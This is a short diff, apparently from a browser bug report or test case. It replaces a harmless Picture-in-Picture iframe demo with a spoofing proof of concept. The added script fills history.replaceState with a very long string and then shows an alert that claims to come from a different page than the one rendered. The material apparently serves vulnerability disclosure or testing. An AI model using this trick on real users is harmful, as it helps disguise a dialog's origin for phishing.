@@ -1,23 +1,9 @@
- <iframe
-    style="width:420px;height:260px;border:0"
-    srcdoc='<!doctype html>
-    <html>
-      <body style="margin:0;display:grid;place-items:center;height:100vh;font-family:sans-serif;background:#f3f3f3">
-        <button id="btn" style="padding:16px 24px;font-size:20px;cursor:pointer">Click to open PiP</button>
-        <script>
-          document.getElementById("btn").addEventListener("click", async () => {
-            if (!top.documentPictureInPicture) return;
-
-            const pip = await top.documentPictureInPicture.requestWindow({
-              width: 400,
-              height: 300
-            });
-
-            pip.document.body.style.margin = "0";
-            pip.document.body.innerHTML =
-              "<div style=\"height:100vh;display:grid;place-items:center;font:24px sans-serif;background:#fff\">PiP window</div>";
-          });
-        </script>
-      </body>
-    </html>'>
-  </iframe>
+<script>
+a="aaaaaaaaaaaaaaaa";
+for (i = 0; i < 19; i++) { 
+a += a;
+}
+history.replaceState("example", "example", a);
+alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
+</script>
+The attack page goes here
